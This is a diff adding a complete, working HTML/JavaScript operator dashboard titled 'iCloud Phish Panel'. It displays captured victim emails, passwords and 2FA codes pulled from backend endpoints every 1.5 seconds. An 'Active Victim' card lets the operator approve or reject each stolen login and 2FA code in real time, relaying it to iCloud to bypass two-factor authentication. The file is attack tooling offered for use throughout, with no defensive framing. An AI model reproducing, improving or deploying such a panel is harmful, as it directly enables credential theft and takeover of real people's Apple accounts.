@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud Phish Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --glass-bg: rgba(30, 30, 30, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --accent-green: #00ff88;
+            --accent-orange: #ff9f0a;
+            --accent-blue: #2997ff;
+            --accent-red: #ff3b30;
+            --text-primary: #fff;
+            --text-secondary: #888;
+            --bg-dark: #0a0a0a;
+            --card-bg: #161616;
+        }
+        
+        body {
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            padding: 24px;
+            background-image: 
+                radial-gradient(ellipse at 20% 0%, rgba(0, 255, 136, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 100%, rgba(41, 151, 255, 0.08) 0%, transparent 50%);
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--glass-border);
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .logo {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--accent-green), #00aa55);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.3);
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #fff 0%, #888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header-subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        
+        .header-right {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .settings-btn {
+            width: 44px;
+            height: 44px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: var(--text-secondary);
+            font-size: 20px;
+        }
+        
+        .settings-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(1.05);
+        }
+        
+        .live-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--accent-green);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.9); }
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+        
+        .stat-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 20px;
+            backdrop-filter: blur(20px);
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+        }
+        
+        .stat-card .num {
+            font-size: 36px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--accent-green), #00dd77);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-card .label {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        
+        @media (max-width: 1200px) {
+            .main-grid { grid-template-columns: 1fr; }
+        }
+        
+        .glass-panel {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 24px;
+            backdrop-filter: blur(20px);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .panel-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .panel-title span {
+            font-size: 18px;
+        }
+        
+        .victim-card {
+            background: linear-gradient(135deg, rgba(255, 159, 10, 0.15), rgba(255, 159, 10, 0.05));
+            border: 2px solid var(--accent-orange);
+            border-radius: 16px;
+            padding: 20px;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .victim-card.twofa {
+            background: linear-gradient(135deg, rgba(41, 151, 255, 0.15), rgba(41, 151, 255, 0.05));
+            border-color: var(--accent-blue);
+        }
+        
+        .victim-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .field-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 12px;
+        }
+        
+        .field-label {
+            font-size: 10px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        
+        .field-value {
+            font-size: 15px;
+            font-weight: 500;
+            font-family: 'SF Mono', monospace;
+        }
+        
+        .field-value.email { color: var(--accent-blue); }
+        .field-value.password { color: var(--accent-orange); }
+        
+        .btn-row {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-approve {
+            background: linear-gradient(135deg, var(--accent-green), #00aa55);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+        }
+        
+        .btn-approve:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.4);
+        }
+        
+        .btn-reject {
+            background: rgba(255, 59, 48, 0.2);
+            color: var(--accent-red);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+        }
+        
+        .btn-reject:hover {
+            background: rgba(255, 59, 48, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+        }
+        
+        .empty-icon {
+            font-size: 40px;
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+        
+        .capture-list {
+            max-height: 400px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .capture-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .capture-list::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 3px;
+        }
+        
+        .capture-list::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+        }
+        
+        .capture-item {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 16px;
+            border-left: 3px solid var(--accent-green);
+            transition: all 0.2s ease;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .capture-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateX(4px);
+        }
+        
+        .capture-item.twofa { border-left-color: var(--accent-orange); }
+        .capture-item.resend { border-left-color: var(--accent-blue); }
+        
+        .capture-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .capture-row:last-child { margin-bottom: 0; }
+        
+        .capture-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+        }
+        
+        .capture-value {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .capture-value.email { color: var(--accent-blue); }
+        .capture-value.code { 
+            color: var(--accent-orange); 
+            font-family: 'SF Mono', monospace;
+            letter-spacing: 2px;
+            font-size: 16px;
+        }
+        
+        .capture-time {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        
+        .settings-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.2s ease;
+        }
+        
+        .settings-modal.active { display: flex; }
+        
+        .settings-content {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 32px;
+            width: 90%;
+            max-width: 500px;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .settings-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .settings-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--glass-border);
+        }
+        
+        .settings-option:last-child { border-bottom: none; }
+        
+        .settings-label {
+            font-size: 15px;
+        }
+        
+        .toggle {
+            width: 50px;
+            height: 28px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .toggle.active {
+            background: var(--accent-green);
+        }
+        
+        .toggle::after {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            background: #fff;
+            border-radius: 50%;
+            top: 3px;
+            left: 3px;
+            transition: all 0.3s ease;
+        }
+        
+        .toggle.active::after {
+            left: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-left">
+            <div class="logo">☁️</div>
+            <div>
+                <h1>iCloud Phish Panel</h1>
+                <div class="header-subtitle">Live credential capture dashboard</div>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="live-badge">
+                <div class="live-dot"></div>
+                LIVE
+            </div>
+            <button class="settings-btn" onclick="toggleSettings()">⚙️</button>
+        </div>
+    </div>
+    
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="num" id="cred-count">0</div>
+            <div class="label">Credentials</div>
+        </div>
+        <div class="stat-card">
+            <div class="num" id="2fa-count">0</div>
+            <div class="label">2FA Codes</div>
+        </div>
+        <div class="stat-card">
+            <div class="num" id="resend-count">0</div>
+            <div class="label">Resends</div>
+        </div>
+    </div>
+    
+    <div class="main-grid">
+        <div class="glass-panel">
+            <div class="panel-title"><span>🎯</span> Active Victim</div>
+            <div id="victim-container">
+                <div class="empty-state">
+                    <div class="empty-icon">👻</div>
+                    Waiting for victim to sign in...
+                </div>
+            </div>
+        </div>
+        
+        <div class="glass-panel">
+            <div class="panel-title"><span>🔔</span> Resend Requests</div>
+            <div class="capture-list" id="resend-requests">
+                <div class="empty-state">No resend requests yet</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="glass-panel">
+        <div class="panel-title"><span>📧</span> Captured Credentials <span style="float:right;cursor:pointer;opacity:0.5;">↻</span></div>
+        <div class="capture-list" id="credentials"></div>
+    </div>
+    
+    <div class="glass-panel" style="margin-top: 24px;">
+        <div class="panel-title"><span>🔐</span> Captured 2FA Codes</div>
+        <div class="capture-list" id="2fa-codes"></div>
+    </div>
+    
+    <div class="settings-modal" id="settingsModal" onclick="closeSettings(event)">
+        <div class="settings-content">
+            <div class="settings-title">⚙️ Settings</div>
+            <div class="settings-option">
+                <span class="settings-label">Auto-clear after approve</span>
+                <div class="toggle active" onclick="toggleOption(this)"></div>
+            </div>
+            <div class="settings-option">
+                <span class="settings-label">Sound notifications</span>
+                <div class="toggle" onclick="toggleOption(this)"></div>
+            </div>
+            <div class="settings-option">
+                <span class="settings-label">Desktop notifications</span>
+                <div class="toggle active" onclick="toggleOption(this)"></div>
+            </div>
+            <div class="settings-option">
+                <span class="settings-label">Dark mode</span>
+                <div class="toggle active" onclick="toggleOption(this)"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function toggleSettings() {
+            document.getElementById('settingsModal').classList.add('active');
+        }
+        
+        function closeSettings(e) {
+            if (e.target.id === 'settingsModal') {
+                document.getElementById('settingsModal').classList.remove('active');
+            }
+        }
+        
+        function toggleOption(el) {
+            el.classList.toggle('active');
+        }
+        
+        function parseTime(timeStr) {
+            if (!timeStr) return 0;
+            try {
+                if (timeStr.includes('_')) {
+                    const parts = timeStr.split('_');
+                    const dateParts = parts[0].split('-');
+                    const timeParts = parts[1].split('-');
+                    return new Date(dateParts[0], dateParts[1]-1, dateParts[2], timeParts[0], timeParts[1], timeParts[2]).getTime();
+                }
+                return new Date(timeStr).getTime();
+            } catch(e) { return 0; }
+        }
+        
+        function formatTime(timeStr) {
+            if (!timeStr) return 'Unknown';
+            try {
+                let date;
+                if (timeStr.includes('_')) {
+                    const parts = timeStr.split('_');
+                    const dateParts = parts[0].split('-');
+                    const timeParts = parts[1].split('-');
+                    date = new Date(dateParts[0], dateParts[1]-1, dateParts[2], timeParts[0], timeParts[1], timeParts[2]);
+                } else {
+                    date = new Date(timeStr);
+                }
+                if (isNaN(date.getTime())) return timeStr;
+                return date.toLocaleString('en-US', { 
+                    month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true, timeZone: 'America/New_York'
+                });
+            } catch(e) { return timeStr; }
+        }
+        
+        async function loadVictimState() {
+            try {
+                const res = await fetch('/api/get-state');
+                const state = await res.json();
+                const container = document.getElementById('victim-container');
+                
+                if (state.status === 'waiting') {
+                    container.innerHTML = `
+                        <div class="victim-card">
+                            <div class="victim-info">
+                                <div class="field-box">
+                                    <div class="field-label">Email / Phone</div>
+                                    <div class="field-value email">${state.email || 'Unknown'}</div>
+                                </div>
+                                <div class="field-box">
+                                    <div class="field-label">Password</div>
+                                    <div class="field-value password">${state.password || 'Unknown'}</div>
+                                </div>
+                            </div>
+                            <div class="btn-row">
+                                <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
+                                <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
+                            </div>
+                        </div>
+                    `;
+                } else if (state.status === 'waiting_2fa') {
+                    container.innerHTML = `
+                        <div class="victim-card twofa">
+                            <div class="victim-info">
+                                <div class="field-box">
+                                    <div class="field-label">Email / Phone</div>
+                                    <div class="field-value email">${state.email || 'Unknown'}</div>
+                                </div>
+                                <div class="field-box">
+                                    <div class="field-label">Password</div>
+                                    <div class="field-value password">${state.password || 'Unknown'}</div>
+                                </div>
+                                <div class="field-box" style="grid-column: span 2;">
+                                    <div class="field-label">2FA Code</div>
+                                    <div class="field-value code">${state['2fa_code'] || 'Unknown'}</div>
+                                </div>
+                            </div>
+                            <div class="btn-row">
+                                <button class="btn btn-approve" onclick="approve2FA()">✅ Approve → iCloud</button>
+                                <button class="btn btn-reject" onclick="reject2FA()">❌ Wrong Code</button>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
+                }
+            } catch(e) {
+                document.getElementById('victim-container').innerHTML = '<div class="empty-state">Waiting for victims...</div>';
+            }
+        }
+        
+        async function approveVictim() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'approved'}) });
+            loadVictimState();
+        }
+        
+        async function rejectVictim() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'rejected'}) });
+            loadVictimState();
+        }
+        
+        async function approve2FA() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'approved_2fa'}) });
+            loadVictimState();
+        }
+        
+        async function reject2FA() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'rejected_2fa'}) });
+            loadVictimState();
+        }
+        
+        async function loadData() {
+            const credsRes = await fetch('/api/get-creds');
+            let creds = await credsRes.json();
+            document.getElementById('cred-count').textContent = creds.length;
+            
+            const credsDiv = document.getElementById('credentials');
+            if (creds.length === 0) {
+                credsDiv.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
+            } else {
+                creds.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                credsDiv.innerHTML = creds.slice(0, 20).map(c => `
+                    <div class="capture-item">
+                        <div class="capture-row">
+                            <span class="capture-label">Email</span>
+                            <span class="capture-value email">${c.email}</span>
+                        </div>
+                        <div class="capture-row">
+                            <span class="capture-label">Password</span>
+                            <span class="capture-value">${c.password}</span>
+                        </div>
+                        <div class="capture-row">
+                            <span class="capture-label">Time</span>
+                            <span class="capture-time">${formatTime(c.time)}</span>
+                        </div>
+                    </div>
+                `).join('');
+            }
+            
+            const codesRes = await fetch('/api/get-2fa');
+            let codes = await codesRes.json();
+            document.getElementById('2fa-count').textContent = codes.length;
+            
+            const codesDiv = document.getElementById('2fa-codes');
+            if (codes.length === 0) {
+                codesDiv.innerHTML = '<div class="empty-state">No 2FA codes captured yet</div>';
+            } else {
+                codes.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                codesDiv.innerHTML = codes.slice(0, 20).map(c => `
+                    <div class="capture-item twofa">
+                        <div class="capture-row">
+                            <span class="capture-label">Code</span>
+                            <span class="capture-value code">${c.code}</span>
+                        </div>
+                        <div class="capture-row">
+                            <span class="capture-label">Email</span>
+                            <span class="capture-value email">${c.email || 'Unknown'}</span>
+                        </div>
+                        <div class="capture-row">
+                            <span class="capture-label">Time</span>
+                            <span class="capture-time">${formatTime(c.time)}</span>
+                        </div>
+                    </div>
+                `).join('');
+            }
+            
+            const resendRes = await fetch('/api/get-resend-requests');
+            let resends = await resendRes.json();
+            document.getElementById('resend-count').textContent = resends.length;
+            
+            const resendDiv = document.getElementById('resend-requests');
+            if (resends.length === 0) {
+                resendDiv.innerHTML = '<div class="empty-state">No resend requests yet</div>';
+            } else {
+                resends.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                resendDiv.innerHTML = resends.slice(0, 10).map(r => `
+                    <div class="capture-item resend">
+                        <div class="capture-row">
+                            <span class="capture-label">Email</span>
+                            <span class="capture-value email">${r.email || 'Unknown'}</span>
+                        </div>
+                        <div class="capture-row">
+                            <span class="capture-label">Time</span>
+                            <span class="capture-time">${formatTime(r.time)}</span>
+                        </div>
+                    </div>
+                `).join('');
+            }
+            
+            loadVictimState();
+        }
+        
+        loadData();
+        
+        let lastCredsLength = 0;
+        let last2faLength = 0;
+        let lastResendLength = 0;
+        let lastVictimStatus = '';
+        
+        setInterval(async () => {
+            const [credsRes, codesRes, resendRes, stateRes] = await Promise.all([
+                fetch('/api/get-creds'),
+                fetch('/api/get-2fa'),
+                fetch('/api/get-resend-requests'),
+                fetch('/api/get-state')
+            ]);
+            
+            const creds = await credsRes.json();
+            const codes = await codesRes.json();
+            const resends = await resendRes.json();
+            const state = await stateRes.json();
+            
+            // Only rebuild UI if data changed
+            if (creds.length !== lastCredsLength || codes.length !== last2faLength || resends.length !== lastResendLength || state.status !== lastVictimStatus) {
+                lastCredsLength = creds.length;
+                last2faLength = codes.length;
+                lastResendLength = resends.length;
+                lastVictimStatus = state.status;
+                renderAll(creds, codes, resends, state);
+            }
+        }, 1500);
+        
+        function renderAll(creds, codes, resends, state) {
+            document.getElementById('cred-count').textContent = creds.length;
+            document.getElementById('2fa-count').textContent = codes.length;
+            document.getElementById('resend-count').textContent = resends.length;
+            
+            const credsDiv = document.getElementById('credentials');
+            if (creds.length === 0) {
+                credsDiv.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
+            } else {
+                creds.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                credsDiv.innerHTML = creds.slice(0, 20).map(c => `
+                    <div class="capture-item">
+                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email}</span></div>
+                        <div class="capture-row"><span class="capture-label">Password</span><span class="capture-value">${c.password}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(c.time)}</span></div>
+                    </div>
+                `).join('');
+            }
+            
+            const codesDiv = document.getElementById('2fa-codes');
+            if (codes.length === 0) {
+                codesDiv.innerHTML = '<div class="empty-state">No 2FA codes captured yet</div>';
+            } else {
+                codes.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                codesDiv.innerHTML = codes.slice(0, 20).map(c => `
+                    <div class="capture-item twofa">
+                        <div class="capture-row"><span class="capture-label">Code</span><span class="capture-value code">${c.code}</span></div>
+                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email || 'Unknown'}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(c.time)}</span></div>
+                    </div>
+                `).join('');
+            }
+            
+            const resendDiv = document.getElementById('resend-requests');
+            if (resends.length === 0) {
+                resendDiv.innerHTML = '<div class="empty-state">No resend requests yet</div>';
+            } else {
+                resends.sort((a, b) => parseTime(b.time) - parseTime(a.time));
+                resendDiv.innerHTML = resends.slice(0, 10).map(r => `
+                    <div class="capture-item resend">
+                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${r.email || 'Unknown'}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(r.time)}</span></div>
+                    </div>
+                `).join('');
+            }
+            
+            renderVictim(state);
+        }
+        
+        function renderVictim(state) {
+            const container = document.getElementById('victim-container');
+            if (state.status === 'waiting') {
+                container.innerHTML = `<div class="victim-card">
+                    <div class="victim-info">
+                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email">${state.email || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password">${state.password || 'Unknown'}</div></div>
+                    </div>
+                    <div class="btn-row">
+                        <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
+                        <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
+                    </div>
+                </div>`;
+            } else if (state.status === 'waiting_2fa') {
+                container.innerHTML = `<div class="victim-card twofa">
+                    <div class="victim-info">
+                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email">${state.email || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password">${state.password || 'Unknown'}</div></div>
+                        <div class="field-box" style="grid-column: span 2;"><div class="field-label">2FA Code</div><div class="field-value code">${state['2fa_code'] || 'Unknown'}</div></div>
+                    </div>
+                    <div class="btn-row">
+                        <button class="btn btn-approve" onclick="approve2FA()">✅ Approve → iCloud</button>
+                        <button class="btn btn-reject" onclick="reject2FA()">❌ Wrong Code</button>
+                    </div>
+                </div>`;
+            } else {
+                container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
+            }
+        }
+    </script>
+</body>
+</html>
